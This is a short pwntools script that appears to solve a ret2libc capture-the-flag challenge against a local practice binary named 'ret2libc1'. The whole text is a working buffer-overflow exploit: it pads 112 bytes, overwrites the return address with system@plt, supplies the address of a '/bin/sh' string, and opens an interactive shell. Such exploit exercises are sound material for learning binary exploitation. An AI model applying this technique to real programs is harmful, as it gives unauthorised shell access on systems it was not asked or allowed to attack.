from pwn import *

io = process('./ret2libc1')

system_plt_address = 0x8048460
bin_sh_address = 0x8048720

payload = b'A'*112 + p32(system_plt_address) + b'BBBB' + p32(bin_sh_address)

io.sendline(payload)

io.interactive()
